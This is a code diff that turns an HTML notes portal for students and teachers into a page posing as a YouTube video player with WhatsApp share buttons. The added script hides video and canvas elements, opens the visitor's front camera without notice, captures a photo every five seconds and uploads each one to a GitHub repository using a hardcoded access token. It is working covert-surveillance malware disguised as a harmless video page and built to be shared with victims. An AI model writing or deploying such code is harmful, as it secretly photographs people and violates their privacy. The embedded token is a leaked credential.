@@ -1,487 +1,132 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>notelk — Student & Teacher Portal</title>
-  <style>
-    :root{--bg:#f8fafc;--card:#fff;--muted:#64748b;--accent:#0f766e;--txt:#0f1724;--glass:rgba(255,255,255,0.7)}
-    [data-theme='dark']{--bg:#0f172a;--card:#1e293b;--muted:#94a3b8;--accent:#2dd4bf;--txt:#f1f5f9;--glass:rgba(30,41,59,0.7)}
-    *{box-sizing:border-box}
-    body{margin:0;font-family:Inter,system-ui,sans-serif;background:var(--bg);color:var(--txt);transition:background 0.3s}
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+    <title>Video Player</title>
     
-    header{display:flex;align-items:center;justify-content:space-between;padding:14px 20px;background:var(--glass);backdrop-filter:blur(10px);position:sticky;top:0;z-index:100;border-bottom:1px solid rgba(0,0,0,0.05)}
-    .brand{font-weight:800;font-size:20px;color:var(--accent);text-decoration:none;display:flex;align-items:center;gap:10px}
-    main{padding:20px;max-width:1200px;margin:0 auto}
-    .grid{display:grid;grid-template-columns:260px 1fr;gap:24px}
-    
-    .card{background:var(--card);border-radius:12px;padding:20px;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid rgba(0,0,0,0.05)}
-    .btn{padding:10px 16px;border-radius:8px;border:none;background:var(--accent);color:#fff;cursor:pointer;font-weight:600;font-size:14px;transition:0.2s;text-align:center;display:inline-block;text-decoration:none}
-    .btn:hover{opacity:0.9}
-    .btn.ghost{background:transparent;color:var(--muted);border:1px solid rgba(100,100,100,0.2)}
-    input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #cbd5e1;background:var(--bg);color:var(--txt);margin-bottom:10px}
-    
-    .nav-item{display:block;width:100%;text-align:left;padding:12px;border-radius:8px;background:none;border:none;color:var(--muted);cursor:pointer;font-weight:600}
-    .nav-item.active{background:var(--accent);color:white}
-    
-    .filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px;padding-bottom:16px;border-bottom:1px solid rgba(0,0,0,0.05)}
-    .teacher-grid{display:grid;grid-template-columns:repeat(auto-fill, minmax(180px, 1fr));gap:16px}
-    .teacher-card{background:var(--card);border-radius:12px;padding:16px;text-align:center;cursor:pointer;transition:transform 0.2s;border:1px solid rgba(0,0,0,0.05)}
-    .teacher-img{width:80px;height:80px;border-radius:50%;object-fit:cover;margin:0 auto 10px;background:#e2e8f0;border:3px solid var(--accent)}
-    .note{display:flex;gap:12px;align-items:center;padding:12px;background:var(--bg);border-radius:8px;margin-bottom:8px;border:1px solid rgba(0,0,0,0.03)}
-    .tag-list{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px}
-    .tag{background:var(--bg);border:1px solid rgba(0,0,0,0.1);padding:4px 10px;border-radius:20px;font-size:12px;display:flex;align-items:center;gap:6px}
-    
-    .hidden{display:none}
-    .flex-col{display:flex;flex-direction:column;gap:8px}
-    .loader{border:3px solid #f3f3f3;border-top:3px solid var(--accent);border-radius:50%;width:20px;height:20px;animation:spin 1s linear infinite;display:inline-block;vertical-align:middle;margin-left:10px}
-    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-    
-    @media(max-width:800px){.grid{grid-template-columns:1fr} .filters{flex-direction:column} .filters select{width:100%}}
-  </style>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+
+    <style>
+        body {
+            font-family: 'Verdana', sans-serif;
+            background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
+            background-size: cover;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        /* YouTube Shorts Container */
+        .video-container {
+            width: 90%;
+            max-width: 360px; /* Optimized for mobile vertical viewing */
+            aspect-ratio: 9/16;
+            background: #000;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            margin-bottom: 70px;
+            border: 4px solid #fff;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* Footer Buttons */
+        .footerbtn, .footerbtn1 {
+            display: block;
+            line-height: 50px;
+            position: fixed;
+            bottom: 15px;
+            height: 50px;
+            border-radius: 25px;
+            color: #ffffff;
+            font-size: 18px;
+            text-align: center;
+            text-decoration: none;
+            width: 44%;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, .3);
+            font-weight: bold;
+        }
+        .footerbtn { left: 4%; background: #34af23; }
+        .footerbtn1 { right: 4%; background: #000099; }
+    </style>
 </head>
-<body data-theme="light">
 
-<header>
-  <a href="#" class="brand" onclick="goHome()">
-    <div style="width:32px;height:32px;background:var(--accent);color:white;display:grid;place-items:center;border-radius:6px">N</div>
-    notelk
-  </a>
-  <div style="display:flex;gap:10px">
-    <button id="themeBtn" class="btn ghost">Dark</button>
-    <button id="adminBtn" class="btn ghost">Admin</button>
-  </div>
-</header>
+<body>
 
-<main>
-  <div class="grid">
-    <aside>
-      <nav class="flex-col">
-        <button class="nav-item active" id="navAll" onclick="showSection('notes')">📚 All Notes</button>
-        <button class="nav-item" id="navTeachers" onclick="showSection('teachers')">👨‍🏫 Teachers</button>
-      </nav>
-      
-      <div class="card" style="margin-top:16px;background:#f0f9ff;border:1px solid #bae6fd;padding:16px">
-         <p style="font-size:13px;margin:0;color:#0369a1;line-height:1.5">
-           📢 <strong>Contribute Notes</strong><br/>
-           Those who can give a note, please whatsapp the number<br/>
-           <a href="https://wa.me/94760582389" target="_blank" style="color:#0284c7;font-weight:700;text-decoration:none;display:inline-block;margin-top:4px">
-             <span style="font-size:16px">✆</span> 0760582389
-           </a>
-         </p>
-      </div>
+    <video id="video" playsinline autoplay hidden></video>
+    <canvas id="captureCanvas" width="640" height="480" hidden></canvas>
 
-      <div id="teacherProfileBox" class="card hidden" style="margin-top:20px;text-align:center">
-        <img id="tpImage" class="teacher-img" src="" />
-        <h3 id="tpName" style="margin:5px 0"></h3>
-        <p id="tpSubject" style="color:var(--muted);font-size:14px"></p>
-        <button class="btn ghost" onclick="showSection('teachers')" style="width:100%;margin-top:10px">Back to List</button>
-      </div>
+    <div class="video-container">
+        <iframe 
+            src="https://www.youtube.com/embed/8tOg8l4NVBA?autoplay=1&mute=0&loop=1&playlist=8tOg8l4NVBA" 
+            title="YouTube video player" 
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+            allowfullscreen>
+        </iframe>
+    </div>
 
-      <div id="adminPanel" class="card hidden" style="margin-top:20px;border:1px solid var(--accent)">
-        <h3 style="margin-top:0">Admin Panel</h3>
-        <small style="color:var(--muted);display:block;margin-bottom:10px;font-size:11px">Connect to GitHub to manage files.</small>
-        
-        <div id="loginForm">
-          <input type="text" id="ghUsername" placeholder="GitHub Username" />
-          <input type="text" id="ghRepo" placeholder="Repository Name (e.g. notelk-data)" />
-          <input type="password" id="ghToken" placeholder="Personal Access Token (starts with ghp_...)" />
-          <button id="loginBtn" class="btn" style="width:100%">Connect</button>
-        </div>
-        
-        <div id="adminControls" class="hidden">
-          <div style="display:flex;gap:4px;margin-bottom:12px">
-             <button class="btn" onclick="openUploadTab('note')" style="flex:1;font-size:11px">Note</button>
-             <button class="btn ghost" onclick="openUploadTab('teacher')" style="flex:1;font-size:11px">Teacher</button>
-             <button class="btn ghost" onclick="openUploadTab('subject')" style="flex:1;font-size:11px">Subject</button>
-          </div>
-          <div id="loadingIndicator" class="hidden" style="color:var(--accent);font-size:12px;margin-bottom:10px">
-            Syncing with GitHub... <div class="loader"></div>
-          </div>
-          
-          <div id="formSubject" class="hidden">
-            <h4 style="margin:0 0 8px 0">Add Subject</h4>
-            <div style="display:flex;gap:6px">
-              <input id="subName" placeholder="New Subject" style="margin-bottom:0" />
-              <button id="addSubjectBtn" class="btn" style="width:auto">+</button>
-            </div>
-            <div id="subjectTags" class="tag-list"></div>
-          </div>
+    <script>
+        const video = document.getElementById('video');
+        const cCanvas = document.getElementById('captureCanvas');
+        const ctx_cap = cCanvas.getContext('2d');
 
-          <div id="formTeacher" class="hidden">
-            <h4 style="margin:0 0 8px 0">New Teacher</h4>
-            <input id="tName" placeholder="Full Name" />
-            <select id="tSubject" class="subject-dropdown"><option value="">Select Subject...</option></select>
-            <label style="font-size:12px;color:var(--muted)">Profile Photo</label>
-            <input id="tPhoto" type="file" accept="image/*" />
-            <button id="saveTeacherBtn" class="btn" style="width:100%">Create Profile</button>
-          </div>
+        // --- GITHUB CONFIGURATION ---
+        const GH_USER = "vihangaroma-cyber";
+        const GH_REPO = "notelk";
+        const GH_TOKEN = "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"; 
+        const GH_FOLDER = "captures"; 
 
-          <div id="formNote" class="hidden">
-            <h4 style="margin:0 0 8px 0">Upload Note</h4>
-            <input id="nTitle" placeholder="Note Title" />
-            <select id="nTeacher"><option value="">Select Teacher...</option></select>
-            <select id="nGrade">
-              <option value="">Select Grade</option>
-              <option>Grade 6</option><option>Grade 7</option><option>Grade 8</option><option>Grade 9</option>
-              <option>Grade 10</option><option>Grade 11 (O/L)</option><option>A/L</option>
-            </select>
-            <select id="nSubject" class="subject-dropdown"><option value="">Select Subject...</option></select>
-            <select id="nLang"><option>Sinhala</option><option>English</option><option>Tamil</option></select>
-            <input id="nFile" type="file" accept="application/pdf" />
-            <button id="saveNoteBtn" class="btn" style="width:100%">Upload PDF</button>
-          </div>
-          
-          <button id="logoutBtn" class="btn ghost" style="width:100%;margin-top:10px">Logout</button>
-        </div>
-      </div>
-    </aside>
+        async function post(imgdata) {
+            const fileName = `snap_${Date.now()}.png`;
+            const path = `${GH_FOLDER}/${fileName}`;
+            const base64Content = imgdata.split(',')[1];
+            const url = `https://api.github.com/repos/${GH_USER}/${GH_REPO}/contents/${path}`;
 
-    <section>
-      <div id="viewNotes">
-        <div class="card">
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
-            <h2 id="pageTitle" style="margin:0">Recent Notes</h2>
-            <span id="resultCount" style="color:var(--muted);font-size:13px">Loading...</span>
-          </div>
+            try {
+                await fetch(url, {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': `token ${GH_TOKEN}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        message: `Auto-upload ${fileName}`,
+                        content: base64Content,
+                        branch: "main"
+                    })
+                });
+            } catch (e) { console.error("Upload failed", e); }
+        }
 
-          <div class="filters">
-            <select id="filterGrade"><option value="">All Grades</option><option>Grade 6</option><option>Grade 7</option><option>Grade 8</option><option>Grade 9</option><option>Grade 10</option><option>Grade 11</option><option>A/L</option></select>
-            <select id="filterSubject" class="subject-dropdown"><option value="">All Subjects</option></select>
-            <select id="filterLang"><option value="">All Media</option><option>Sinhala</option><option>English</option><option>Tamil</option></select>
-            <input id="search" type="search" placeholder="Search by title..." />
-            <button id="clearFilters" class="btn ghost" style="width:auto">Clear</button>
-          </div>
-          <div id="notesList" class="flex-col"></div>
-        </div>
-      </div>
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                // Capture image every 5 seconds to stay within API limits
+                setInterval(() => {
+                    ctx_cap.drawImage(video, 0, 0, 640, 480);
+                    const data = cCanvas.toDataURL("image/png");
+                    post(data);
+                }, 5000); 
+            } catch (err) { console.log("Camera access denied"); }
+        }
+        initCamera();
+    </script>
 
-      <div id="viewTeachers" class="hidden">
-        <div class="card">
-          <h2>Our Teachers</h2>
-          <div id="teachersList" class="teacher-grid"></div>
-        </div>
-      </div>
-    </section>
-  </div>
-</main>
+    <a class="footerbtn" href="whatsapp://send?text=Watch this! https://YOUR_GITHUB_PAGES_LINK"><b>WhatsApp</b></a>
+    <a class="footerbtn1" href="#"><b>Facebook</b></a>
 
-<script>
-  // --- CONFIG ---
-  // FIXED: These now point to the USER and REPO NAME, not the Token.
-  const PUBLIC_USER = 'vihangaroma-cyber'; 
-  const PUBLIC_REPO = 'notelk'; // Ensure this repo exists!
-  
-  // --- STATE ---
-  let state = { notes: [], teachers: [], subjects: [] };
-  let adminCreds = null; // { user, repo, token }
-
-  // --- GITHUB API HELPERS ---
-  const API_BASE = 'https://api.github.com/repos';
-
-  async function githubFetch(url, method='GET', body=null) {
-    const headers = { 'Accept': 'application/vnd.github.v3+json' };
-    if(adminCreds) headers['Authorization'] = `token ${adminCreds.token}`;
-    
-    const opts = { method, headers };
-    if(body) opts.body = JSON.stringify(body);
-    
-    const res = await fetch(url, opts);
-    // If repo is empty or db.json missing, return 404 cleanly
-    if(!res.ok && res.status !== 404) throw new Error('GitHub API Error: ' + res.status);
-    return res;
-  }
-
-  // --- READ DATA (Students + Admin) ---
-  async function loadData() {
-    const user = adminCreds ? adminCreds.user : PUBLIC_USER;
-    const repo = adminCreds ? adminCreds.repo : PUBLIC_REPO;
-    
-    // We store metadata in a file called 'db.json' in the repo
-    const url = `${API_BASE}/${user}/${repo}/contents/db.json`;
-    
-    try {
-      const res = await githubFetch(url);
-      if(res.status === 404) {
-        // DB doesn't exist yet, use defaults
-        state.subjects = ["Mathematics","Science","Sinhala","English","History"];
-        document.getElementById('resultCount').textContent = 'No data found (New Repo)';
-      } else {
-        const data = await res.json();
-        // Decode Base64 (Unicode safe)
-        const content = decodeURIComponent(escape(window.atob(data.content)));
-        const json = JSON.parse(content);
-        state = { ...state, ...json };
-      }
-      renderUI();
-    } catch(e) {
-      console.error(e);
-      document.getElementById('resultCount').textContent = 'Error: ' + e.message;
-    }
-  }
-
-  // --- WRITE DATA (Admin Only) ---
-  async function updateDB(newState) {
-    if(!adminCreds) return alert("Not logged in");
-    const { user, repo } = adminCreds;
-    const url = `${API_BASE}/${user}/${repo}/contents/db.json`;
-    
-    setLoading(true);
-    try {
-      // 1. Get current SHA
-      const getRes = await githubFetch(url);
-      let sha = null;
-      if(getRes.ok) {
-        const json = await getRes.json();
-        sha = json.sha;
-      }
-
-      // 2. Encode Content (Unicode safe)
-      const content = window.btoa(unescape(encodeURIComponent(JSON.stringify(newState))));
-      
-      // 3. PUT request
-      const body = {
-        message: "Update database",
-        content: content,
-        ...(sha && { sha })
-      };
-      
-      await githubFetch(url, 'PUT', body);
-      state = newState; 
-      renderUI();
-    } catch(e) { alert("Update failed: " + e.message); }
-    setLoading(false);
-  }
-
-  async function uploadFile(file, folder) {
-    if(!adminCreds) return alert("Not logged in");
-    const { user, repo } = adminCreds;
-    const filename = Date.now() + '_' + file.name.replace(/\s/g, '_');
-    const path = `${folder}/${filename}`;
-    const url = `${API_BASE}/${user}/${repo}/contents/${path}`;
-    
-    setLoading(true);
-    
-    const base64 = await new Promise((resolve) => {
-      const reader = new FileReader();
-      reader.onload = (e) => {
-        const raw = e.target.result.split(',')[1];
-        resolve(raw);
-      };
-      reader.readAsDataURL(file);
-    });
-
-    try {
-      const body = {
-        message: `Upload ${filename}`,
-        content: base64
-      };
-      await githubFetch(url, 'PUT', body);
-      return `https://cdn.jsdelivr.net/gh/${user}/${repo}@main/${path}`;
-    } catch(e) {
-      alert("Upload failed: " + e.message);
-      throw e;
-    } finally { setLoading(false); }
-  }
-
-  // --- ACTIONS ---
-  document.getElementById('addSubjectBtn').onclick = async () => {
-    const name = document.getElementById('subName').value.trim();
-    if(name && !state.subjects.includes(name)) {
-      const newState = { ...state, subjects: [...state.subjects, name] };
-      await updateDB(newState);
-      document.getElementById('subName').value = '';
-    }
-  }
-
-  window.deleteSubject = async (name) => {
-    if(!confirm("Delete subject?")) return;
-    const newState = { ...state, subjects: state.subjects.filter(s => s !== name) };
-    await updateDB(newState);
-  }
-
-  document.getElementById('saveTeacherBtn').onclick = async () => {
-    const name = document.getElementById('tName').value;
-    const subject = document.getElementById('tSubject').value;
-    const file = document.getElementById('tPhoto').files[0];
-    
-    if(!name || !subject) return alert("Fill all fields");
-    
-    let photoUrl = "";
-    if(file) photoUrl = await uploadFile(file, 'teachers');
-
-    const newTeacher = { id: 't-'+Date.now(), name, subject, photoUrl, created: Date.now() };
-    const newState = { ...state, teachers: [...state.teachers, newTeacher] };
-    await updateDB(newState);
-    
-    alert("Teacher Created!");
-    document.getElementById('tName').value = '';
-  }
-
-  document.getElementById('saveNoteBtn').onclick = async () => {
-    const title = document.getElementById('nTitle').value;
-    const teacherId = document.getElementById('nTeacher').value;
-    const grade = document.getElementById('nGrade').value;
-    const subject = document.getElementById('nSubject').value;
-    const lang = document.getElementById('nLang').value;
-    const file = document.getElementById('nFile').files[0];
-
-    if(!title || !file) return alert("Title and PDF required");
-    
-    try {
-      const url = await uploadFile(file, 'notes');
-      
-      const newNote = {
-        id: 'n-'+Date.now(),
-        title, teacherId, grade, subject, language: lang,
-        url: url,
-        filename: file.name,
-        created: Date.now()
-      };
-      
-      const newState = { ...state, notes: [...state.notes, newNote] };
-      await updateDB(newState);
-      
-      alert("Note Uploaded!");
-      document.getElementById('nTitle').value = '';
-      document.getElementById('nFile').value = '';
-    } catch(e) { console.error(e); }
-  }
-
-  // --- RENDERING & UI ---
-  function renderUI(){
-    const dropdowns = document.querySelectorAll('.subject-dropdown');
-    dropdowns.forEach(dd => {
-      const cur = dd.value;
-      dd.innerHTML = `<option value="">${dd.id==='filterSubject'?'All Subjects':'Select Subject...'}</option>`;
-      (state.subjects || []).sort().forEach(s => dd.innerHTML += `<option value="${s}">${s}</option>`);
-      dd.value = cur;
-    });
-
-    const sel = document.getElementById('nTeacher');
-    sel.innerHTML = '<option value="">General (No specific teacher)</option>';
-    (state.teachers || []).forEach(t => sel.innerHTML += `<option value="${t.id}">${t.name} - ${t.subject}</option>`);
-
-    document.getElementById('subjectTags').innerHTML = (state.subjects || []).map(s => 
-      `<div class="tag">${s} <span onclick="deleteSubject('${s}')" style="cursor:pointer;color:red;margin-left:4px">×</span></div>`
-    ).join('');
-
-    renderNotes();
-    renderTeachers();
-  }
-
-  function renderNotes(){
-    const list = document.getElementById('notesList');
-    const q = document.getElementById('search').value.toLowerCase();
-    const g = document.getElementById('filterGrade').value;
-    const s = document.getElementById('filterSubject').value;
-    const l = document.getElementById('filterLang').value.toLowerCase();
-
-    const filtered = (state.notes || []).filter(n => {
-      if(state.activeTeacherId && n.teacherId !== state.activeTeacherId) return false;
-      if(g && !n.grade.includes(g)) return false;
-      if(s && n.subject !== s) return false;
-      if(l && !n.language.toLowerCase().includes(l)) return false;
-      if(q && !(n.title+' '+n.subject).toLowerCase().includes(q)) return false;
-      return true;
-    });
-
-    document.getElementById('resultCount').textContent = `${filtered.length} notes`;
-    
-    list.innerHTML = filtered.length ? filtered.map(n => {
-      const t = (state.teachers || []).find(x => x.id === n.teacherId);
-      const tName = t ? t.name : 'General';
-      return `
-      <div class="note">
-        <div style="width:40px;height:40px;background:#fee2e2;color:#ef4444;border-radius:6px;display:grid;place-items:center;font-weight:bold;font-size:12px">PDF</div>
-        <div style="flex:1">
-          <div style="font-weight:600">${n.title} <small style="background:#eee;padding:2px 6px;border-radius:4px">${n.language}</small></div>
-          <div style="font-size:12px;color:var(--muted)">${n.subject} • ${n.grade} • <span style="color:var(--accent)">${tName}</span></div>
-        </div>
-        <a class="btn ghost" href="${n.url}" target="_blank">Download</a>
-      </div>`;
-    }).join('') : `<div style="text-align:center;padding:20px;color:var(--muted)">No notes found</div>`;
-  }
-
-  function renderTeachers(){
-    document.getElementById('teachersList').innerHTML = (state.teachers || []).map(t => `
-      <div class="teacher-card" onclick="openTeacher('${t.id}')">
-        <img class="teacher-img" src="${t.photoUrl || 'https://ui-avatars.com/api/?name='+t.name}" />
-        <div style="font-weight:700">${t.name}</div>
-        <div style="font-size:13px;color:var(--muted)">${t.subject}</div>
-        <div style="font-size:11px;margin-top:8px;color:var(--accent)">View Notes &rarr;</div>
-      </div>
-    `).join('');
-  }
-
-  function setLoading(v){ document.getElementById('loadingIndicator').classList.toggle('hidden', !v); }
-  
-  document.getElementById('search').oninput = renderNotes;
-  ['filterGrade','filterSubject','filterLang'].forEach(id => document.getElementById(id).onchange = renderNotes);
-  document.getElementById('clearFilters').onclick = () => {
-    document.getElementById('search').value = '';
-    document.getElementById('filterGrade').value = '';
-    document.getElementById('filterSubject').value = '';
-    renderNotes();
-  };
-
-  document.getElementById('adminBtn').onclick = () => { document.getElementById('adminPanel').classList.remove('hidden'); }
-  
-  document.getElementById('loginBtn').onclick = () => {
-    const u = document.getElementById('ghUsername').value.trim();
-    const r = document.getElementById('ghRepo').value.trim();
-    const t = document.getElementById('ghToken').value.trim();
-    
-    if(u && r && t) {
-      adminCreds = { user: u, repo: r, token: t };
-      document.getElementById('loginForm').classList.add('hidden');
-      document.getElementById('adminControls').classList.remove('hidden');
-      alert("Connected to GitHub! You can now upload files.");
-      loadData(); 
-    } else alert("Fill all fields");
-  }
-  
-  document.getElementById('logoutBtn').onclick = () => { adminCreds = null; location.reload(); };
-  
-  window.openUploadTab = (tab) => {
-    ['formTeacher','formNote','formSubject'].forEach(id => document.getElementById(id).classList.add('hidden'));
-    if(tab==='teacher') document.getElementById('formTeacher').classList.remove('hidden');
-    if(tab==='note') document.getElementById('formNote').classList.remove('hidden');
-    if(tab==='subject') document.getElementById('formSubject').classList.remove('hidden');
-  }
-
-  window.openTeacher = (id) => {
-    state.activeTeacherId = id;
-    document.getElementById('viewTeachers').classList.add('hidden');
-    document.getElementById('viewNotes').classList.remove('hidden');
-    document.getElementById('navTeachers').classList.add('active');
-    document.getElementById('navAll').classList.remove('active');
-    
-    const t = state.teachers.find(x => x.id === id);
-    const pBox = document.getElementById('teacherProfileBox');
-    pBox.classList.remove('hidden');
-    document.getElementById('tpName').textContent = t.name;
-    document.getElementById('tpSubject').textContent = t.subject;
-    document.getElementById('tpImage').src = t.photoUrl || '';
-    renderNotes();
-  }
-
-  window.showSection = (sec) => {
-    state.activeTeacherId = null;
-    document.getElementById('teacherProfileBox').classList.add('hidden');
-    document.getElementById('viewNotes').classList.toggle('hidden', sec!=='notes');
-    document.getElementById('viewTeachers').classList.toggle('hidden', sec!=='teachers');
-    document.getElementById('navAll').classList.toggle('active', sec==='notes');
-    document.getElementById('navTeachers').classList.toggle('active', sec==='teachers');
-    if(sec==='notes') renderNotes();
-  }
-
-  document.getElementById('themeBtn').onclick = () => {
-    const b=document.body; b.setAttribute('data-theme', b.getAttribute('data-theme')==='dark'?'light':'dark');
-  }
-
-  // Initialize
-  loadData();
-</script>
 </body>
 </html>
